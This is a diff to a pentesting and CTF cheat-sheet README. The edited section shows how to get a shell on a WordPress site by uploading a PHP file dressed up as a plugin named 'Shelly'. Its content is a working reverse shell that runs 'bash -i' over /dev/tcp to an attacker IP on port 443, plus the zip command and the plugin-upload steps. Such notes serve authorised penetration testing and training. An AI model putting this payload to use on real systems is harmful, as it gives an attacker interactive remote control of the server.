@@ -113,12 +113,24 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```
   ```php
   <?php
-  exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'");
+
+  /**
+  * Plugin Name: Shelly
+  * Plugin URI:
+  * Description: Love Shelly
+  * Version: 1.0
+  * Author: d4t4s3c
+  * Author URI: http://github.com/d4t4s3c
+  */
+
+  exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.75/443 0>&1'");
   ?>
   ```
+  
   ```cmd
   root@kali:~# zip reverse.zip reverse.php
   ```
+  
   * Plugins
   
   * Add New
